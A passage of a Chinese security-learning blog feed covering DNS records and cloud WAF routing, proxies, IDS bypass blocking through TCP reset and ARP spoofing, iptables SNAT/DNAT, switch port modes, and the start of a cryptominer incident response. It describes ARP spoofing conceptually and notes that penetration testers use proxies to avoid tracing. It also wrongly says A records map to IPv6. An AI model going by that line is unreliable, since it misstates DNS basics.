href="#DNS记录：">¶</a>DNS记录：</h4><ul><li><strong>A记录</strong>：用于将域名解析到IPv6地址的一种DNS记录类型。</li><li><strong>AAAA记录</strong>：用于将域名解析到IPv6地址的一种DNS记录类型。</li><li><strong>CNAME记录</strong>：主机名到主机名的映射，如果需要将域名指向另一个域名，而不是一个IP地址，就需要添加CNAME记录。</li><li><strong>MX记录</strong>：邮件交换记录，主要用于邮箱解析，在发送邮件时根据收件人的地址后缀进行邮件服务器的定位。</li><li><strong>TXT记录</strong>：用于某个主机名的标识和说明，通过设置TXT记录可以使别人更方便地联系到你。</li><li><strong>PTR记录</strong>：A记录的反向记录，用于将一个IP地址指向对应的主机名，实现通过IP地址访问域名。</li><li><strong>SRV记录</strong>：服务定位资源记录。</li><li>**NS记录：**用于指定域名应该由哪些DNS服务器解析。</li></ul><p>一般比较重要的是<strong>A、CNAME、PTR、NS</strong></p><p><strong>云WAF利用DNS引流的具体原理是：</strong></p><p>​把域名的解析权交给云WAF，云WAF利用DNS调度技术，改变网络流量的原始流向，将网络流量牵引到云端的WAF上，云端的WAF对流量进行净化和过滤后，将安全的流量回传给后端真实的应用，最终达到安全过滤和保护的作用。</p><h3 id="具体实操："><a class="header-anchor" href="#具体实操：">¶</a>具体实操：</h3><p><strong>将域名解析权交给云WAF的具体步骤如下：</strong></p><ol><li>登录您的<strong>域名注册商</strong>或域名管理平台的网站。</li><li>找到您要转移的域名，并进入其管理页面。</li><li>在管理页面中，找到DNS设置或域名解析设置选项。</li><li>修改DNS设置（通常采用修改域名<strong>NS记录</strong>或<strong>CNAME记录</strong>的方式），<strong>将原有的DNS服务器地址更改为云WAF提供的DNS服务器地址。</strong></li><li>保存更改并等待DNS生效。生效时间可能因域名注册商和DNS缓存情况而有所不同，一般需要几分钟到几小时不等。</li></ol><p>请注意，在更改DNS设置之前，您需要确保已经与云WAF提供商完成了相关配置和接入工作，并获得了正确的DNS服务器地址。此外，更改DNS设置可能会影响您的网站访问，因此请在操作前仔细确认并备份相关设置。</p><h3 id="移交域名解析权"><a class="header-anchor" href="#移交域名解析权">¶</a>移交域名解析权</h3><p>在DNS技术中，移交域名解析权通常涉及将域名的管理权和控制权从一个DNS服务提供商转移到另一个。这通常发生在域名所有者更换托管服务、重新委托域名管理或进行其他与域名相关的操作时。以下是移交域名解析权的一般步骤：</p><ol><li><strong>确定当前注册商和DNS服务提供商</strong>：首先，需要确定域名的当前注册商和DNS服务提供商。这些信息通常可以在域名的WHOIS记录中找到。</li><li><strong>联系当前DNS服务提供商</strong>：联系当前DNS服务提供商，了解他们关于域名解析权转移的具体政策和流程。</li><li><strong>获取转移码或授权码</strong>：根据当前DNS服务提供商的要求，可能需要获取一个转移码或授权码。这个码通常用于验证域名所有者的身份，并授权新的DNS服务提供商接管域名的解析权。</li><li><strong>选择新的DNS服务提供商</strong>：选择一个新的DNS服务提供商，并确保他们支持你想要使用的DNS功能和特性。</li><li><strong>提交转移请求</strong>：使用从当前DNS服务提供商获取的转移码或授权码，向新的DNS服务提供商提交域名解析权转移请求。</li></ol><h3 id="反向代理："><a class="header-anchor" href="#反向代理：">¶</a>反向代理：</h3><p><strong>正向代理</strong></p><p>​是一个位于客户端和目标服务器之间的代理服务器（中间服务器）。为了从目标服务器取得内容，客户端向代理服务器发送一个请求，<strong>并且指定目标服务器</strong>，之后代理向目标服务器转发请求，将获得的内容返回给客户端。</p><p><strong>作用：</strong></p><ul><li>正向代理需要主动设置代理服务器ip或者域名进行访问，由设置的服务器ip或者域名去访问内容并返回</li><li>正向代理是<strong>代理客户端</strong>，为客户端收发请求，<strong>使真实客户端对服务器不可见。</strong></li></ul><p><strong>用途：</strong></p><ul><li>渗透人员为了防止溯源通常所搭建的代理服务就是正向代理，用于保护真实客服端。</li><li>典型用途是为防火墙内的局域网客户端提供访问服务器的途径，正向代理还可以使用缓冲特性减少网络利用率。</li><li>科学上网。</li></ul><p><strong>反向代理</strong></p><p>​是指以代理服务器来接收客户端的请求，然后将请求转发给内部网络上的服务器，将从服务器上得到的结果返回给客户端，此时代理服务器对外表现为一个反向代理服务器。</p><p>对于客户端来说，反向代理就相当于目标服务器，只需要将反向代理当作目标服务器一样发送请求就可以了，并且客户端不需要进行任何设置。</p><p>反向代理是<strong>代理服务器</strong>，为服务器收发请求，使真实服务器对客户端不可见。</p><p><strong>用途：</strong></p><ul><li><strong>隐藏服务器真实ip</strong>：使用反向代理，可以对客户端隐藏服务器的ip地址</li><li><strong>负载均衡</strong>：反向代理服务器可以做负载均衡，根据所有真实服务器的负载情况，将客户端请求分发到不同的真实服务器上</li><li><strong>提高访问速度</strong>：反向代理服务器可以对静态内容及短时间内有大量访问请求的动态内容提供缓存服务，提高访问速度</li><li><strong>提供安全保障</strong>：反向代理服务器可以作为应用层防火墙，为网站提供对基于web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等</li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>理论知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>旁路阻断技术</title>
    <link href="/posts/438053c9.html"/>
    <url>/posts/438053c9.html</url>
    
    <content type="html"><![CDATA[<h1>旁路阻断技术</h1><p>旁路阻断就是采用旁路的方式侦听通信的数据包，然后再进行协议还原，根据内容进行阻断。这类技术的优点是不影响互联网访问的速度，并且对用户没有特殊的设置要求。通俗讲是并联在互联网的出口上，不会影响原来网络的稳定性，部署也很方便。</p><p>采用旁路的方式管理网络并阻断非法连接的方法可以分为三类：<br>1、 发送TCP Reset包<br>2、 通过与网关产品联动，建立临时规则<br>3、 进行基于arp的阻断方式。</p><h3 id="一、TCP-Reset"><a class="header-anchor" href="#一、TCP-Reset">¶</a>一、TCP Reset</h3><p>我们以IDS为例，IDS设备是一个典型的旁路监听并通过TCP Reset进行阻断的网络安全设备。IDS TCP Reset实现方法，当IDS发现一条非法得连接IDS将会向通信的两端各发送一个TCP RESET包，从而实现主动切断连接的目的，此时通信双方的堆栈将会把这个RESET包解释为另一端的回应，然后停止整个通信过程，释放缓冲区并撤销所有TCP状态信息。这个时候，攻击数据包可能还在目标主机操作系统TCP/IP堆栈缓冲区中，没有被提交给应用程序，由于缓冲区被清空了，所以攻击不会发生。</p><p>对于RESET包来说，IDS发出的RESET包的前提是知道整个会话当前的序列号和确认号，否则这个RESET包将会被忽略。我们假定一个会话得确认号必须为152如果你发送的RESET包的确认号为142，那么堆栈将会认为这是一个无效的数据包或者被破坏的数据包而将它忽略掉。</p><p>从另一方面讲所有的IDS在响应攻击时都有延迟时间，因为IDS从抓取数据包，监测攻击，产生RESET包，到最后发出RESET整个过程都要消耗一定的时间。很多的IDS使用<a href="https://so.csdn.net/so/search?q=libpcap&amp;spm=1001.2101.3001.7020">libpcap</a>库来抓包，大部分IDS构建在类BSD的系统上，BSD系统下是利用BPF(Berkeley Packet Filters)进行抓包，BPF默认将会开一个很大的缓冲区，在一个典型的网络中，IDS发出RESET包的过程大约会延迟半秒。在Linux和Solaris平台上，性能要稍微好一点，但是肯定也有延迟时间。</p><p>而且TCP Rest对于网络得应用来说也有着很大得局限性，其只能针对通常得标准TCP连接发送阻断信息，对于UDP会话是无能为力得。再则目前得一些网络应用软件在会话连接保持上都很强得能力，TCP Reset包对于他们得效果基本可以忽略。</p><h3 id="二、与网关产品联动"><a class="header-anchor" href="#二、与网关产品联动">¶</a>二、与网关产品联动</h3><p>通过与网关产品的联动方式主要是向防火墙发送临时规则，以及路由器或交换机发送临时ACL列表，阻断当前这个会话。</p><p>这种方式存在着这么几个方面得问题：</p><p>1、首先是联动协议问题。“联动”一直是网络安全界中的一个很时髦的概念，虽然已经有五六年的历史，但是到目前为止，还远远没有得到充分的发展。现在联动得实现是以现有得某个厂家为核心，其他厂家的产品在一些半公开的SDK的支持下实现与核心厂家的某个产品实现互联。这样导致现有和多产品有联动功能，但是没有联动得实际效果。</p><p>2、联动信息的滞后。即使产品与防火墙有着优良得联动相应方式，IDS产品在检测得过程中发现了非法得连接，生成一条临时规则发送到防火墙，防火墙应用这条规则阻断这个连接;在这一个过程中存在着三个延时，一、IDS发现非法连接，生成临时规则;二、规则传输给防火墙;三、防火墙应用规则。这三个演示得总时间最好情况下是小于两秒，而且这个过程当中IDS的检测是滞后IDS检测到非法连接时，这个连接已经建立了，如果这个连接时蠕虫，或木马，两秒的延时足够成功攻击了。</p><p>3、当遇到大规模的非法连接的时候，IDS会针对每一条会话向防火墙添加临时规则，这样势必造成防火墙临时规则增大，降低防火墙的效率，引起防火墙包转发延时，严重造成防火墙瘫痪，网络中断。</p><h3 id="三、基于arp的阻断"><a class="header-anchor" href="#三、基于arp的阻断">¶</a>三、基于arp的阻断</h3><p>共有三种方式ARP 欺骗、ARP 投毒和 ARP 攻击。先了解ARP的原理。ARP 用于将 IP 地址匹配到或解析至恰当的 MAC 地址，所有的网络设备都有一张 ARP 表，里面临时记忆着该设备已经匹配起来的所有的 IP 地址和 MAC 地址。ARP 表能够确保该设备不需要向已经与自己进行过通信的计算机重复 ARP 询问。当有人在未获得授权时就企图更改 MAC 和 IP 地址的 ARP 表格中的信息时，就发生了 ARP 攻击。通过这种方式我们可以伪造ARP应答包，使得非法连接主机的ARP表错误，无法连接到网关，从而阻断连接。</p><p>这种阻断方式从效果上讲是很强的，但是同时也造成了一个问题，其不但阻止了非法连接，而且也阻断了合法连接，这对于网络中的正常应用是有着很大的影响。</p><p>实际大家比较常用的是采用发送TCP Reset包，上文提到的主要缺点都是可以解决的。</p><h3 id="reset"><a class="header-anchor" href="#reset">¶</a>reset</h3><p>RST 标志</p><p>Reset，复位标志，用于非正常地关闭连接。它是 TCP 协议首部里的一个标志位。发送 RST 包关闭连接时，直接丢弃缓冲区的包并发送 RST 包，而接收端收到 RST 包后，也不必发送 ACK 包来确认。</p><p>TCP 套接字在任何状态下，只要收到 RST 包，即可进入 CLOSED 初始状态，不会有任何回应。至于是否通知上层应用，要根据应用程序是阻塞模式还是非阻塞模式：</p><p>阻塞模型下，内核无法主动通知应用层出错，只有应用层主动调用 read() 或者 write() 这样的 IO 系统调用时，内核才会利用出错来通知应用层对端 RST。<br>非阻塞模型下，select 或者 epoll 会返回 sockfd 可读，应用层对其进行读取时，read() 会报错 RST。<br>FIN 标志</p><p>发端完成发送任务标识。用来释放一个连接。FIN=1 表明此报文段的发送端的数据已经发送完毕，并要求释放连接。</p><p>RST 和 FIN 的区别</p><p>正常地关闭连接用 FIN 标志位，但 FIN 标志位不能用来处理异常情况；<br>RST 会导致连接立即终止，而在 FIN 中会得到确认。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>理论知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SNAT策略概述</title>
    <link href="/posts/ae353ca9.html"/>
    <url>/posts/ae353ca9.html</url>
    
    <content type="html"><![CDATA[<h2 id="SNAT策略概述"><a class="header-anchor" href="#SNAT策略概述">¶</a>SNAT策略概述</h2><p>**SNAT（Source Network Address Translation，源地址转换）**是Linux防火墙的一种地址转换操作，也是iptables命令中的一种数据包控制类型，其作用是根据特定的条件修改数据包的源IP地址。</p><h3 id="1、SNAT应用环境"><a class="header-anchor" href="#1、SNAT应用环境">¶</a>1、SNAT应用环境</h3><p>局域网主机共享单个公网IP地址接入Internet（私有IP不能在Internet中正常路由）</p><h3 id="2、SNAT原理"><a class="header-anchor" href="#2、SNAT原理">¶</a>2、SNAT原理</h3><ul><li>修改数据包源地址</li></ul><h3 id="3、SNAT转换的前提条件"><a class="header-anchor" href="#3、SNAT转换的前提条件">¶</a>3、SNAT转换的前提条件</h3><ul><li>局域网各主机已正确设置IP地址、子网掩码、默认网关地址</li><li>Linux网关开启IP路由转发</li></ul><p>二、SNAT策略的应用<br>1、临时打开</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">Linux网关开启IP路由转发:<br><br>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/</span> ipv4/ip_forward<br>或<br>sysctl -w net. ipv4.ip_forward=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>2、永久打开</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">永久打开<br>Linux网关开启IP路由转发:<br><br>vim <span class="hljs-regexp">/etc/</span>sysctl.conf<br>net.ipv4.ip_forward = <span class="hljs-number">1</span>      <span class="hljs-comment">#将此行写入配置文件</span><br><br>sysctl -p           <span class="hljs-comment">#读取修改后的配置</span><br></code></pre></td></tr></table></figure><h3 id="3、SNAT转换1：固定的公网IP地址"><a class="header-anchor" href="#3、SNAT转换1：固定的公网IP地址">¶</a>3、SNAT转换1：固定的公网IP地址</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">iptables -t nat -<span class="hljs-keyword">A</span> POSTROUTING -s <span class="hljs-number">192.168.80.0</span>/<span class="hljs-number">24</span> -o ens33 -j SNAT --to <span class="hljs-number">12.0.0.1</span><br>或<br>iptables -t nat -<span class="hljs-keyword">A</span> POSTROUTING -s <span class="hljs-number">192.168.80.0</span>/<span class="hljs-number">24</span> -o ens33 -j SNAT --to-source <span class="hljs-number">12.0.0.1</span>-<span class="hljs-number">12.0.0.10</span><br>                                     内网IP       出站 外网网卡                      外网IP或地址池<br><br></code></pre></td></tr></table></figure><h3 id="4、SNAT转换2：非固定的公网IP地址（共享动态IP地址）"><a class="header-anchor" href="#4、SNAT转换2：非固定的公网IP地址（共享动态IP地址）">¶</a>4、SNAT转换2：非固定的公网IP地址（共享动态IP地址）</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iptables</span> -t nat -A POSTROUTING -s <span class="hljs-number">192.168.80.0</span>/<span class="hljs-number">24</span> -o ens33 -j MASQUERADE<br></code></pre></td></tr></table></figure><ul><li>扩展：一个IP地址做SNAT转换，一般可以让内网100到200台主机实现上网</li></ul><h2 id="DNAT策略概述"><a class="header-anchor" href="#DNAT策略概述">¶</a>DNAT策略概述</h2><h3 id="1、DNAT应用环境"><a class="header-anchor" href="#1、DNAT应用环境">¶</a>1、DNAT应用环境</h3><ul><li>在Internet中发布位于局域网内的服务器</li></ul><h3 id="2、DNAT原理"><a class="header-anchor" href="#2、DNAT原理">¶</a>2、DNAT原理</h3><ul><li>修改数据包的目标地址</li></ul><h3 id="3、DNAT前提条件"><a class="header-anchor" href="#3、DNAT前提条件">¶</a>3、DNAT前提条件</h3><ul><li>局域网的Web服务器能够访问Internet</li><li>网关的外网IP地址有正确的DNS解析记录</li><li>Linux网关支持IP路由转发</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/sysctl.conf<br>net.ipv4.ip_forward = 1<br><br>sysctl -p<br><br></code></pre></td></tr></table></figure><h2 id="DNAT策略的应用"><a class="header-anchor" href="#DNAT策略的应用">¶</a>DNAT策略的应用</h2><h3 id="1、DNAT转换1：发布内网的Web服务"><a class="header-anchor" href="#1、DNAT转换1：发布内网的Web服务">¶</a>1、DNAT转换1：发布内网的Web服务</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">#把从ens33进来的要访问web服务的数据包目的地址转换为 <span class="hljs-number">192.168</span>.<span class="hljs-number">80.11</span><br>iptables -t nat -<span class="hljs-selector-tag">A</span> PREROUTING -<span class="hljs-selector-tag">i</span> ens33 -d <span class="hljs-number">12.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j DNAT <span class="hljs-attr">--to</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">80.11</span><br>或<br>iptables -t nat -<span class="hljs-selector-tag">A</span> PREROUTING -<span class="hljs-selector-tag">i</span> ens33 -d <span class="hljs-number">12.0</span>.<span class="hljs-number">0.1</span> -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j DNAT <span class="hljs-attr">--to-destination</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">80.11</span><br>                             入站 外网网卡  外网IP   内网服务器IP<br> <br>iptables -t nat -<span class="hljs-selector-tag">A</span> PREROUTING -<span class="hljs-selector-tag">i</span> ens33 -<span class="hljs-selector-tag">p</span> tcp <span class="hljs-attr">--dport</span> <span class="hljs-number">80</span> -j DNAT <span class="hljs-attr">--to</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">80.11</span>-<span class="hljs-number">192.168</span>.<span class="hljs-number">80.20</span><br></code></pre></td></tr></table></figure><h3 id="2、DNAT转换2：发布时修改目标端口"><a class="header-anchor" href="#2、DNAT转换2：发布时修改目标端口">¶</a>2、DNAT转换2：发布时修改目标端口</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#发布局域网内部的OpenSSH服务器，外网主机需使用250端口进行连接</span><br><span class="hljs-attribute">iptables</span> -t nat -A PREROUTING -i ens33 -d <span class="hljs-number">12.0.0.1</span> -p tcp --dport <span class="hljs-number">250</span> -j DNAT --to <span class="hljs-number">192.168.80.11:22</span><br><br><span class="hljs-comment">#在外网环境中使用SSH测试</span><br><span class="hljs-attribute">ssh</span> -p <span class="hljs-number">250</span> root@<span class="hljs-number">12.0.0.1</span><br><br><span class="hljs-attribute">yum</span> -y install net-tools #若没有 ifconfig 命令可提前使用 yum 进行安装<br><span class="hljs-attribute">ifconfig</span> ens33<br></code></pre></td></tr></table></figure><ul><li>注意：使用DNAT时，同时还有配合SNAT使用，才能实现响应数据包的正确返回。</li><li>主机型防火墙：主要使用 INPUT、OUTPUT 链，设置规则时一般要详细的指定到端口</li><li>网络型防火墙：主要使用 FORWARD 链，设置规则时很少去指定到端口，一般指定到IP地址或者到网段即可</li></ul><h2 id="总结："><a class="header-anchor" href="#总结：">¶</a>总结：</h2><p><strong>SNAT源地址转换过程（针对客户端）：</strong></p><p>数据包从内网发送到公网时，SNAT会把数据包的源地址由私网IP转换成公网IP。<br>当相应的数据包从公网发送到内网时，会把数据包的目的地址由公网IP转换为私网IP。<br>当内网有多台主机访问外网时，SNAT在转换时会自动分配端口，不同内网主机会通过端口号进行区分。</p><p><strong>DNAT源地址转换过程（针对服务器）：</strong></p><p>数据包从外网发送到内网时，DNAT会把数据包的目标地址由公网IP转换成私网IP。<br>当相应的数据包从内网发送到公网时，会把数据包的源地址由私网IP转换为公网IP。客户机想访问服务器时，访问的是网关地址，由网关去找服务器的内网地址。<br>如果多台服务器使用同一个网关，那么通过不同的端口号来对应不同的服务器。</p>]]></content>
    
    
    <categories>
      
      <category>计网知识</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三层交换机中trunk、access、hybrid、channel</title>
    <link href="/posts/15f8bb0c.html"/>
    <url>/posts/15f8bb0c.html</url>
    
    <content type="html"><![CDATA[<h2 id="三层交换机中trunk、access、hybrid、channel"><a class="header-anchor" href="#三层交换机中trunk、access、hybrid、channel">¶</a>三层交换机中trunk、access、hybrid、channel</h2><h3 id="1-Trunk"><a class="header-anchor" href="#1-Trunk">¶</a>1. Trunk</h3><p><strong>概念:</strong></p><p><strong>VLAN Trunk(虚拟局域网中继技术)</strong> 是指能让连接在不同交换机上的相同VLAN中的主机互通。</p><p>Trunk端口是三层交换机上的一种特殊端口，它可以承载多个VLAN的流量。Trunk端口通常用于连接其他交换机、路由器或服务器等网络设备。</p><p><strong>原理:</strong></p><p>Trunk端口通过802.1Q协议来实现VLAN间通信。802.1Q协议在以太网帧头中添加了VLAN ID字段，用于区分不同VLAN的流量。</p><p><strong>作用:</strong></p><ul><li>连接不同VLAN的交换机</li><li>连接VLAN和路由器</li><li>连接VLAN和服务器</li></ul><p><strong>配置示例:</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">FastEthernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">1</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">trunk</span><br></code></pre></td></tr></table></figure><p><strong>1、trunk端口接收帧时：</strong></p><p>①接收没有vlan tag的帧，trunk端口将帧打上vlan tag，vlan ID和本端口的PVID相同，若该PVID在trunk端口的放行vlan中，送入交换机，若PVID不在trunk端口的放行vlan中，丢弃该帧。</p><p>②接收有vlan tag的帧，若帧的vlan ID在trunk端口的放行vlan中，送入交换机，若vlan ID不在trunk端口的放行vlan中，丢弃该帧。</p><p><strong>2、trunk端口发送帧时：</strong></p><p>trunk端口只能发送放行vlan中的帧，若该帧的vlan ID和trunk的PVID相同，则剥掉vlan tag发送；若该帧的vlan ID和trunk的PVID不同，则保留原有vlan tag发送。</p><h3 id="2-Access"><a class="header-anchor" href="#2-Access">¶</a>2. Access</h3><p><strong>概念:</strong></p><p>Access端口是三层交换机上的一种普通端口，它只能属于一个VLAN。Access端口通常用于连接终端设备，如PC机、IP电话等。</p><p><strong>原理:</strong></p><p>Access端口只允许属于其所属VLAN的流量通过。</p><p><strong>作用:</strong></p><ul><li>连接终端设备</li><li>将终端设备隔离在不同的VLAN中</li></ul><p><strong>配置示例:</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">FastEthernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">2</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">access</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">access</span> <span class="hljs-symbol">vlan</span> <span class="hljs-symbol">10</span><br></code></pre></td></tr></table></figure><p><strong>1、access端口接收帧时：</strong></p><p>①如果接收的帧有vlan tag时，该帧的vlan ID和access端口的PVID相同时，将该帧送入交换机；该帧的vlan ID和access端口的PVID不同时，丢弃帧。</p><p>②如果接收的帧没有vlan tag时，access端口会将该帧打上vlan tag，vlan ID即为本端口的PVID，送入交换机。</p><p><strong>2、access端口发送帧时：</strong></p><p>access端口只能发送vlan ID和端口PVID相同的帧，发送出去时会剥掉vlan tag。</p><h3 id="3-Hybrid"><a class="header-anchor" href="#3-Hybrid">¶</a>3. Hybrid</h3><p><strong>概念:</strong></p><p>Hybrid端口是三层交换机上的一种混合端口，它既可以属于一个VLAN，也可以承载多个VLAN的流量。Hybrid端口通常用于连接需要同时访问多个VLAN的设备，如服务器、打印机等。</p><p><strong>原理:</strong></p><p>Hybrid端口可以配置允许访问的VLAN列表。</p><p><strong>作用:</strong></p><ul><li>连接需要同时访问多个VLAN的设备</li><li>将服务器隔离在不同的VLAN中</li></ul><p><strong>配置示例:</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">FastEthernet</span> <span class="hljs-symbol">0</span>/<span class="hljs-symbol">3</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">hybrid</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">access</span> <span class="hljs-symbol">vlan</span> <span class="hljs-symbol">10</span><br><span class="hljs-symbol">switchport</span> <span class="hljs-symbol">trunk</span> <span class="hljs-symbol">allowed</span> <span class="hljs-symbol">vlan</span> <span class="hljs-symbol">10</span>,<span class="hljs-symbol">20</span><br></code></pre></td></tr></table></figure><p><strong>1、hybrid端口接收帧时：</strong></p><p>①接收没有vlan tag的帧，hybrid端口将帧打上vlan tag，vlan ID和本端口的PVID相同，若该PVID在hybrid端口的放行vlan中，送入交换机，若PVID不在hybrid端口的放行vlan中，丢弃该帧。</p><p>②接收有vlan tag的帧，若帧的vlan ID在hybrid端口的放行vlan中，送入交换机，若vlan ID不在hybrid端口的放行vlan中，丢弃该帧。</p><p><strong>2、hybrid端口发送帧时：</strong></p><p>hybrid端口只能发送放行vlan中的帧，可以通过命令来控制发送时是否携带vlan tag。</p><h3 id="4-Channel"><a class="header-anchor" href="#4-Channel">¶</a>4. Channel</h3><p><strong>概念:</strong></p><p>Channel是三层交换机上的一种端口组，它将多个物理端口捆绑在一起，形成一个逻辑上的链路。Channel可以用于增加链路带宽、提高链路可靠性等。</p><p><strong>原理:</strong></p><p>Channel通过将多个物理端口的流量聚合成一个链路来实现。</p><p><strong>作用:</strong></p><ul><li>增加链路带宽</li><li>提高链路可靠性</li></ul><p><strong>配置示例:</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">channel-<span class="hljs-keyword">group</span> <span class="hljs-title">1</span> mode active<br>channel-<span class="hljs-keyword">group</span> <span class="hljs-title">1</span> add interface FastEthernet <span class="hljs-number">0</span>/<span class="hljs-number">4</span><br>channel-<span class="hljs-keyword">group</span> <span class="hljs-title">1</span> add interface FastEthernet <span class="hljs-number">0</span>/<span class="hljs-number">5</span><br><br>interface FastEthernet <span class="hljs-number">0</span>/<span class="hljs-number">4</span><br>switchport mode channel<br>switchport channel-<span class="hljs-keyword">group</span> <span class="hljs-title">1</span><br><br>interface FastEthernet <span class="hljs-number">0</span>/<span class="hljs-number">5</span><br>switchport mode channel<br>switchport channel-<span class="hljs-keyword">group</span> <span class="hljs-title">1</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><table><thead><tr><th>类型</th><th>概念</th><th>原理</th><th>作用</th><th>配置示例</th></tr></thead><tbody><tr><td>Trunk</td><td>承载多个VLAN的流量</td><td>802.1Q协议</td><td>连接不同VLAN的设备</td><td><code>switchport mode trunk</code></td></tr><tr><td>Access</td><td>只能属于一个VLAN</td><td>只允许所属VLAN的流量通过</td><td>连接终端设备</td><td><code>switchport mode access</code><br><code>switchport access vlan 10</code></td></tr><tr><td>Hybrid</td><td>既可以属于一个VLAN，也可以承载多个VLAN的流量</td><td>配置允许访问的VLAN列表</td><td>连接需要同时访问多个VLAN的设备</td><td><code>switchport mode hybrid</code><br><code>switchport access vlan 10</code><br><code>switchport trunk allowed vlan 10,20</code></td></tr><tr><td>Channel</td><td>将多个物理端口捆绑在一起</td><td>将多个物理端口的流量聚合成一个链路</td><td>增加链路带宽、提高链路可靠性</td><td><code>channel-group 1 mode active</code><br><code>channel-group 1 add interface FastEthernet 0/4</code><br><code>channel-group 1 add interface FastEthernet 0/5</code><br><code>switchport mode channel</code><br><code>switchport channel-group 1</code></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>计网知识</category>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux以及docker挖矿木马应急响应</title>
    <link href="/posts/226c5eba.html"/>
    <url>/posts/226c5eba.html</url>
    
    <content type="html"><![CDATA[<p>模拟背景：某个服务器被攻击，攻击特征为服务器cpu利用率非常高，服务器很卡，怀疑被挖矿。</p><h1>linux</h1><ol><li>使用top命令查看主机运行状态</li></ol><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure><p>发现某个进程cpu占有率很高，pid为xxxx</p><ol start="2"><li>查看进程详细信息</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span> | grep xxxx<br><span class="hljs-built_in">ps</span> aux <span class="hljs-comment">#查看所有进程信息</span><br></code></pre></td></tr></table></figure><ol start="3"><li>查看进程在哪个目录</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 